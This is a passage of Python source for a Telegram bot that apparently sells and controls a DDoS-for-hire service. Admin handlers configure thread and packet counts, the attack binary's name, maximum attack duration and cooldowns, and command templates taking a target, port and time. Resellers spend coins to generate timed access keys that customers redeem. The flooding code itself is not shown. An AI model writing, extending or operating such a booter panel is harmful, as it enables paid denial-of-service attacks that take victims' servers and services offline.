        markup.add(types.InlineKeyboardButton(file, callback_data=f"download_{file}"))

    # Add Cancel button
    markup.add(types.InlineKeyboardButton("🅾️ Cancel download", callback_data="cancel_download"))
    
    bot.send_message(message.chat.id, "📂 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗳𝗶𝗹𝗲 𝘁𝗼 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("download_"))
def send_file(call):
    user_id = str(call.message.chat.id)

    if user_id not in admin_id:
        bot.answer_callback_query(call.id, "⛔ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        return

    filename = call.data.replace("download_", "")

    if not os.path.exists(filename):
        bot.answer_callback_query(call.id, "❌ 𝗙𝗶𝗹𝗲 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.")
        return

    bot.answer_callback_query(call.id, "📥 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱...")

    animation_msg = bot.edit_message_text(
        "📥 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲 [░░░░░░░░░░] 0%",
        call.message.chat.id,
        call.message.message_id
    )

    progress_steps = [(20, "▓▓░░░░░░░░"), (50, "▓▓▓▓▓░░░░░"), (80, "▓▓▓▓▓▓▓▓░░"), (100, "▓▓▓▓▓▓▓▓▓▓")]
    for progress, bar in progress_steps:
        time.sleep(1)
        bot.edit_message_text(f"📥 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲 [{bar}] {progress}%", call.message.chat.id, animation_msg.message_id)

    with open(filename, "rb") as file:
        bot.send_document(call.message.chat.id, file)

    bot.edit_message_text("✅ 𝗙𝗶𝗹𝗲 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!", call.message.chat.id, animation_msg.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "cancel_download")
def cancel_download(call):
    bot.edit_message_text("❗️ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", call.message.chat.id, call.message.message_id)
    
# --------------------------------------------------------------
        
        
    
        
        
# --------------------[ ATTACK SETTINGS ]----------------------

@bot.message_handler(func=lambda message: message.text == "Threads")
def set_threads(message):
    """Admin command to change threads."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝘁𝗵𝗿𝗲𝗮𝗱𝘀:")
        bot.register_next_step_handler(message, process_new_threads)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_threads(message):
    new_threads = message.text.strip()
    
    if " " in new_threads or not new_threads.isalnum():
        bot.reply_to(message, "⚠️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿!")
        return
        
    global threads
    threads = new_threads
    save_config()  # Save changes
    bot.reply_to(message, f"✅ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_threads}")
        
@bot.message_handler(func=lambda message: message.text == "Binary")
def set_binary(message):
    """Admin command to change the binary name."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝗲𝘄 𝗯𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲:")
        bot.register_next_step_handler(message, process_new_binary)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_binary(message):
    new_binary = message.text.strip()
    
    # Ensure the name is one word (no spaces)
    if " " in new_binary or not new_binary.isalnum():
        bot.reply_to(message, "⚠️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝗮𝗺𝗲!")
        return
    
    global BINARY
    BINARY = new_binary
    save_config()  # Save changes
    bot.reply_to(message, f"✅ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: *{new_binary}*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "Packets")
def set_packets(message):
    """Admin command to change packets."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝗽𝗮𝗰𝗸𝗲𝘁𝘀:")
        bot.register_next_step_handler(message, process_new_packets)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_packets(message):
    new_packets = message.text.strip()
    
    # Ensure the name is one word (no spaces)
    if " " in new_packets or not new_packets.isalnum():
        bot.reply_to(message, "⚠️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝗮𝗺𝗲!")
        return
    
    global packets
    packets = new_packets
    save_config()  # Save changes
    bot.reply_to(message, f"✅ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_packets}")

@bot.message_handler(func=lambda message: message.text == "Parameters")
def set_command_type(message):
    """Admin command to change the full_command_type using inline buttons."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("parameters 1", callback_data="arg_1")
        btn2 = types.InlineKeyboardButton("parameters 2", callback_data="arg_2")
        btn3 = types.InlineKeyboardButton("parameters 3", callback_data="arg_3")
        markup.add(btn1, btn2, btn3)
        
        bot.reply_to(message, "🔹 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 𝘁𝘆𝗽𝗲:", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("arg_"))
def process_parameters_selection(call):
    """Handles parameters selection via inline buttons."""
    global full_command_type
    selected_arg = int(call.data.split("_")[1])  # Extract parameters number

    # Update the global command type
    full_command_type = selected_arg
    save_config()  # Save the new configuration

    # Generate response message based on the selected parameters
    if full_command_type == 1:
        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 1:\n `<target> <port> <time>`"
    elif full_command_type == 2:
        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 2:\n `<target> <port> <time> <threads>`"
    elif full_command_type == 3:
        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 3:\n `<target> <port> <time> <packet> <threads>`"
    else:
        response_message = "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻."

    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response_message, parse_mode='Markdown')
        
@bot.message_handler(func=lambda message: message.text == "Attack Cooldown")
def set_attack_cooldown(message):
    """Admin command to change attack cooldown time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻:")
        bot.register_next_step_handler(message, process_new_attack_cooldown)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_attack_cooldown(message):
    global ATTACK_COOLDOWN
    try:
        new_cooldown = int(message.text)
        ATTACK_COOLDOWN = new_cooldown
        save_config()  # Save changes
        bot.reply_to(message, f"✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
    except ValueError:
        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
        
@bot.message_handler(func=lambda message: message.text == "Attack Time")
def set_attack_time(message):
    """Admin command to change max attack time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "⏳ 𝗘𝗻𝘁𝗲𝗿 𝗺𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀):")
        bot.register_next_step_handler(message, process_new_attack_time)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_attack_time(message):
    global MAX_ATTACK_TIME
    try:
        new_attack_time = int(message.text)
        MAX_ATTACK_TIME = new_attack_time
        save_config()  # Save changes
        bot.reply_to(message, f"✅ 𝗠𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_attack_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
    except ValueError:
        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ KEY MANAGEMENT ]----------------------
        
@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_command(message):
    user_id = str(message.chat.id)
    
    # Check if user exists and if their access has expired
    if user_id in users:
        expiration_time = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            bot.reply_to(message, "❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕")
            return  # User still has access, so we stop here
            
    bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip().upper()

    if key in keys:
        key_data = keys[key]
        
        # Check if key is expired
        if key_data["expiration"] is not None:
            key_expiration = datetime.datetime.strptime(key_data["expiration"], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() > key_expiration:
                bot.reply_to(message, "📛 𝗞𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 📛")
                return

        if key_data["status"] == "unused":
            # If expiration exists (from reset), use it; otherwise, set new expiration
            if key_data["expiration"] is None:
                duration_in_hours = key_data["validity"]
                new_expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_in_hours)
                key_data["expiration"] = new_expiration_time.strftime('%Y-%m-%d %H:%M:%S')

            # Grant access to user
            users[user_id] = key_data["expiration"]
            save_users()

            # Update key status
            key_data["status"] = "used"
            key_data["redeemed_by"] = user_id
            save_keys()

            bot.reply_to(message, f"✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝘂𝗻𝘁𝗶𝗹: {convert_utc_to_ist(users[user_id])}")
        else:
            bot.reply_to(message, "📛 𝗞𝗲𝘆 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝘂𝘀𝗲𝗱 📛")
    else:
        bot.reply_to(message, "📛 𝗞𝗲𝘆 𝗶𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 📛")

# --- Bot Handlers ---
@bot.message_handler(func=lambda message: message.text == "Generate Key")
def generate_key_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:  # Ensure it's a list
        markup = types.InlineKeyboardMarkup(row_width=1)
        button1 = types.InlineKeyboardButton("Generate Days", callback_data="admin_days")
        button2 = types.InlineKeyboardButton("Generate Hours", callback_data="admin_hours")
        markup.add(button1, button2)
        bot.send_message(message.chat.id, "✅ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝘁𝘆𝗽𝗲:", reply_markup=markup)

    elif user_id in resellers:
        markup = types.InlineKeyboardMarkup(row_width=1)
        button1 = types.InlineKeyboardButton("1 Day - 80 Coins", callback_data="select_1_day")
        button2 = types.InlineKeyboardButton("7 Days - 400 Coins", callback_data="select_7_days")
        button3 = types.InlineKeyboardButton("30 Days - 900 Coins", callback_data="select_30_days")
        cancel_button = types.InlineKeyboardButton("Cancel ⭕️", callback_data="cancel_key_selection")
        markup.add(button1, button2, button3, cancel_button)
        bot.send_message(message.chat.id, "✅ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻:", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗿 𝗮𝗱𝗺𝗶𝗻")

# Handle Cancel Button
@bot.callback_query_handler(func=lambda call: call.data == "cancel_key_selection")
def cancel_key_selection(call):
    bot.edit_message_text("❗️𝗞𝗲𝘆 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗶𝗼𝗻 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱❗️", call.message.chat.id, call.message.message_id)


@bot.callback_query_handler(func=lambda call: call.data in ["admin_days", "admin_hours"])
def handle_admin_selection(call):
    user_id = str(call.message.chat.id)

    if user_id not in admin_id:
        bot.answer_callback_query(call.id, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆")
        return

    time_type = "days" if call.data == "admin_days" else "hours"

    bot.edit_message_text(
        f"✅ 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 *{time_type}*:",
        call.message.chat.id, call.message.message_id, parse_mode='Markdown')

    bot.register_next_step_handler(call.message, process_generate_key, user_id, time_type)


@bot.callback_query_handler(func=lambda call: call.data in ["select_1_day", "select_7_days", "select_30_days"])
def handle_reseller_selection(call):
    user_id = str(call.message.chat.id)

    if user_id not in resellers:
        bot.answer_callback_query(call.id, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆")
        return

    duration_mapping = {"select_1_day": 1, "select_7_days": 7, "select_30_days": 30}
    days = duration_mapping[call.data]
    cost = KEY_COSTS[days]

    if resellers[user_id]["coins"] < cost:
        bot.edit_message_text("❌ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗼𝗶𝗻𝘀!", call.message.chat.id, call.message.message_id)
        return

    # Ask for confirmation with both confirm and decline buttons
    markup = types.InlineKeyboardMarkup(row_width=2)
    confirm_button = types.InlineKeyboardButton("🟢 Accept", callback_data=f"confirm_{days}")
    decline_button = types.InlineKeyboardButton("🔴 Decline", callback_data="decline_key")
    markup.row(decline_button, confirm_button)

    bot.edit_message_text(
        f"⚡ 𝗖𝗼𝗻𝗳𝗶𝗿𝗺 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗶𝗼𝗻:\n\n"
        f"📅 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {days} 𝗱𝗮𝘆𝘀\n"
        f"💰 𝗖𝗼𝘀𝘁: {cost} 𝗰𝗼𝗶𝗻𝘀",
        call.message.chat.id, call.message.message_id, reply_markup=markup)

# Handle Decline Button
@bot.callback_query_handler(func=lambda call: call.data == "decline_key")
def decline_key_generation(call):
    bot.edit_message_text("❗️𝗞𝗲𝘆 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗶𝗼𝗻 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱❗️", call.message.chat.id, call.message.message_id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_"))
def confirm_reseller_key(call):
    user_id = str(call.message.chat.id)
    days = int(call.data.split("_")[1])
    cost = KEY_COSTS[days]

    if user_id not in resellers or resellers[user_id]["coins"] < cost:
        bot.edit_message_text("❌ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗼𝗶𝗻𝘀!", call.message.chat.id, call.message.message_id)
        return

    resellers[user_id]["coins"] -= cost
    save_resellers()

    key = generate_key(f"{days}D")  # Example: MEG-1D-XXXXXX
    keys[key] = {
        "validity": days * 24,  # Convert days to hours
        "status": "unused",
        "redeemed_by": None,
        "expiration": None,
        "generated_by": user_id  # Store reseller ID
    }
    save_keys()

    response = (f"✅ 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n"
                f"🔑 𝗞𝗲𝘆: `{key}`\n"
                f"⏳ 𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: {days} 𝗗𝗮𝘆𝘀\n"
                f"🔰 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗨𝗻𝘂𝘀𝗲𝗱\n"
                f"💰 𝗖𝗼𝘀𝘁: `{cost}` 𝗰𝗼𝗶𝗻𝘀")

    bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')


def process_generate_key(message, user_id, time_type):
    try:
        time_amount = int(message.text)
        if time_amount <= 0:
            raise ValueError("Invalid number")

        duration_in_hours = time_amount if time_type == "hours" else time_amount * 24
        duration = f"{time_amount}{time_type[0].upper()}"  # Example: 7H or 12D

        key = generate_key(duration)

        # Store the key with the required format
        keys[key] = {
            "validity": duration_in_hours,
            "status": "unused",
            "redeemed_by": None,
            "expiration": None,
            "generated_by": user_id  # Store who generated it
        }
        save_keys()

        response = (f"✅ 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n"
                    f"🔑 𝗞𝗲𝘆: `{key}`\n"
                    f"⏳ 𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: {time_amount} {time_type}\n"
                    f"🔰 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗨𝗻𝘂𝘀𝗲𝗱")

        bot.send_message(message.chat.id, response, parse_mode='Markdown')

    except ValueError:
        bot.send_message(message.chat.id, "⛔️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁! 𝗘𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿.")
        
@bot.message_handler(func=lambda message: message.text == "Reset Key")
def reset_key_command(message):
    user_id = str(message.chat.id)

    # Check if user is an admin or reseller
    if user_id not in admin_id and user_id not in resellers:
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼 𝗻𝗼𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
        return

    bot.reply_to(message, "🔑 𝗦𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")

    # Set bot to wait for the next message containing the key
    bot.register_next_step_handler(message, process_reset_key)


def process_reset_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip().upper()  # Convert key to uppercase

    if key in keys:
        if keys[key]["status"] == "used":
            redeemed_user = keys[key]["redeemed_by"]

            # Confirmation buttons
            markup = telebot.types.InlineKeyboardMarkup()
            markup.add(
                telebot.types.InlineKeyboardButton("❌ Decline", callback_data="cancel_reset"),
                telebot.types.InlineKeyboardButton("✅ Confirm", callback_data=f"reset_{key}")
            )

            bot.reply_to(
                message,
                f"⚠️ 𝗔𝗿𝗲 𝘆𝗼𝘂 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗿𝗲𝘀𝗲𝘁 𝘁𝗵𝗶𝘀 𝗸𝗲𝘆?\n\n"
                f"🔑 𝗞𝗲𝘆: `{key}`\n"
                f"👤 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗕𝘆: `{redeemed_user}`\n"
                f"⏳ 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: `{keys[key]['expiration']}`",
                reply_markup=markup,
                parse_mode='Markdown'
            )
        else:
            bot.reply_to(message, "❕𝗧𝗵𝗶𝘀 𝗸𝗲𝘆 𝗶𝘀 𝗻𝗼𝘁 𝘂𝘀𝗲𝗱 𝘆𝗲𝘁!")
    else:
        bot.reply_to(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗻𝗼𝗻-𝗲𝘅𝗶𝘀𝘁𝗲𝗻𝘁 𝗸𝗲𝘆!")


@bot.callback_query_handler(func=lambda call: call.data.startswith("reset_"))
def confirm_reset_key(call):
    key = call.data.split("_")[1]

    if key in keys and keys[key]["status"] == "used":
        redeemed_user = keys[key]["redeemed_by"]

        # Reset key but keep expiration
        keys[key]["status"] = "unused"
        keys[key]["redeemed_by"] = None
        save_keys()

        # Check if user has other active keys
        user_active_keys = [k for k, v in keys.items() if v.get("redeemed_by") == redeemed_user]
        
        if not user_active_keys and redeemed_user in users:
            del users[redeemed_user]
            save_users()

        bot.edit_message_text(
            f"✅ 𝗞𝗲𝘆 `{key}` 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝘀𝗲𝘁!\n"
            f"👤 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗨𝘀𝗲𝗿 `{redeemed_user}` 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗶𝗳 𝗻𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗸𝗲𝘆𝘀 𝗹𝗲𝗳𝘁.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown'
        )
    else:
        bot.edit_message_text("❗️𝗞𝗲𝘆 𝗿𝗲𝘀𝗲𝘁 𝗳𝗮𝗶𝗹𝗲𝗱!", call.message.chat.id, call.message.message_id)


@bot.callback_query_handler(func=lambda call: call.data == "cancel_reset")
def cancel_reset(call):
    bot.edit_message_text("❗️𝗞𝗲𝘆 𝗿𝗲𝘀𝗲𝘁 𝗰𝗮𝗻𝗰𝗲𝗹𝗲𝗱.", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda message: message.text == "My Keys")
def my_keys_command(message):
    user_id = str(message.chat.id)

    if user_id not in resellers and user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗿 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        return

    # Fetch all keys generated by this reseller or admin
    user_keys = [key for key, data in keys.items() if data.get("generated_by") == user_id]

    if not user_keys:
        bot.reply_to(message, "❕ 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗻𝗼𝘁 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗮𝗻𝘆 𝗸𝗲𝘆𝘀 𝘆𝗲𝘁.")
        return

    from datetime import datetime

    response = ["🛅 𝗠𝘆 𝗞𝗲𝘆𝘀:\n\n"]  # Use list for better performance

    for key in user_keys:
        key_data = keys[key]
        status = key_data["status"]
        expiration = key_data.get("expiration")
        redeemed_by = key_data.get("redeemed_by")
        validity_hours = key_data.get("validity", 0)

        # Check if the key has expired
        if expiration:
            try:
                expiration_time = datetime.strptime(expiration, "%Y-%m-%d %H:%M:%S")
                if expiration_time < datetime.now():
                    expiration = "Expired ⛔️"
            except ValueError:
                expiration = "Invalid Date"

        # Format validity
        if expiration and expiration != "Expired ⛔️":
            expiration_text = f"𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {expiration}"
        elif expiration == "Expired ⛔️":
            expiration_text = "𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Expired ⛔️"
        else:
            days = validity_hours // 24
            hours = validity_hours % 24
            if days > 0 and hours > 0:
                validity_text = f"{days} day{'s' if days > 1 else ''}, {hours} hour{'s' if hours > 1 else ''}"
            elif days > 0:
                validity_text = f"{days} day{'s' if days > 1 else ''}"
            else:
                validity_text = f"{hours} hour{'s' if hours > 1 else ''}"
            expiration_text = f"𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: {validity_text}"

        # Formatting keys based on status
        if status == "unused":
            if expiration and expiration != "Expired ⛔️":
                response.append(f"🟡 𝗨𝗻𝘂𝘀𝗲𝗱 [reset]: `{key}`\n{expiration_text}\n\n")
            else:
                response.append(f"🟢 𝗨𝗻𝘂𝘀𝗲𝗱: `{key}`\n{expiration_text}\n\n")
        elif status == "used":
            response.append(f"🔴 𝗨𝘀𝗲𝗱: `{key}`\n𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗕𝘆: `{redeemed_by}`\n{expiration_text}\n\n")

    # Send messages in chunks of 4096 characters
    response_text = "".join(response)
    for i in range(0, len(response_text), 4096):
        bot.reply_to(message, response_text[i:i + 4096], parse_mode='Markdown')
    
    
# ------------------------------------------------------------------
        

        
        
        
# --------------------[ ADMIN PANEL SETTINGS ]----------------------
      
@bot.message_handler(func=lambda message: message.text == "View Keys")
def handle_all_keys(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.")
        return

    if not keys:
        bot.send_message(message.chat.id, "📭 𝗡𝗼 𝗸𝗲𝘆𝘀 𝗳𝗼𝘂𝗻𝗱!")
        return

    from datetime import datetime

    def format_validity(hours):
        """Convert hours into a readable format (e.g., 1 day, 2 hours)"""
        if hours < 24:
            return f"{hours} hours"
        days = hours // 24
        remaining_hours = hours % 24
        if remaining_hours == 0:
            return f"{days} day{'s' if days > 1 else ''}"
        return f"{days} day{'s' if days > 1 else ''}, {remaining_hours} hours"

    key_list = ["🛅 𝗔𝗹𝗹 𝗞𝗲𝘆𝘀:\n\n"]  # Store in a list for efficient concatenation

    for key, data in keys.items():
        status = data.get("status", "unused")
        validity = data.get("validity", 0)
        redeemed_by = data.get("redeemed_by", "null")
        expiration = data.get("expiration", None)  # None if not set

        if expiration:
            try:
                expiration_time = datetime.strptime(expiration, "%Y-%m-%d %H:%M:%S")  # Adjust format if needed
                if expiration_time < datetime.now():
                    expiration = "Expired ⛔️"
            except ValueError:
                expiration = "Invalid Date"

        if status == "unused" and expiration and expiration != "Expired ⛔️":
            key_list.append(
                f"🟡 𝗨𝗻𝘂𝘀𝗲𝗱 [reset]: `{key}`\n"
                f"𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {expiration}\n\n"
            )
        elif status == "used":
            key_list.append(
